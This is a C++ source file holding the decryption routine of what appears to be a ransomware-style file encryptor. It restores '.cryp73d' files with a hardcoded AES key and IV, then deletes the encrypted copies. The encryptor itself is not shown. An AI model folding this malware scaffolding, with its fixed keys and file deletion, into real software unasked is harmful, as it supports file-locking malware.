#include "cryp73r.hpp"
/*
void  f_decryptor(std::string filepath) {

    std::ifstream file_in(filepath);
    
    if (!file_in.is_open()) {
        std::cerr << "Failed to open " + filepath << std::endl;
        return ;
    }

    CryptoPP::SecByteBlock key(key_0);
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
    for (int i = 0; i < CryptoPP::AES::BLOCKSIZE; i++)
        iv[i] = iv_0[i];

    std::string ciphertext((std::istreambuf_iterator<char>(file_in)), (std::istreambuf_iterator<char>()));
    file_in.close();
    std::string decryptedtext;

    CryptoPP::AES::Decryption aesDecryption(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, iv);

    CryptoPP::StreamTransformationFilter stfDecryptor(cbcDecryption, new CryptoPP::StringSink(decryptedtext));
    stfDecryptor.Put(reinterpret_cast<const unsigned char*>(ciphertext.c_str()), ciphertext.size());
    stfDecryptor.MessageEnd();

    std::ofstream file_out(filepath);
    file_out << decryptedtext;
    file_out.close();

    std::cout << filepath + " decrypted, hopefully.." << std::endl;

}*/

void f_decryptor(std::string filepath)
{
    if (filepath.length() <= 8)
        return;
    std::string ext = filepath.substr(filepath.length() - 8);
    if (ext != ".cryp73d" || filepath[filepath.length() - 9] == '/')
        return;
    CryptoPP::SecByteBlock key(key_0);
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
    for (int i = 0; i < CryptoPP::AES::BLOCKSIZE; i++)
        iv[i] = iv_0[i];
    
    std::ifstream infile(filepath, std::ios::binary);
    std::ofstream outfile(filepath.substr(0, filepath.length() - 8), std::ios::binary);

    CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption decryptor(key, key.size(), iv);
    CryptoPP::FileSource(infile, true, new CryptoPP::StreamTransformationFilter(decryptor, new CryptoPP::FileSink(outfile)));
    std::remove(filepath.c_str());
}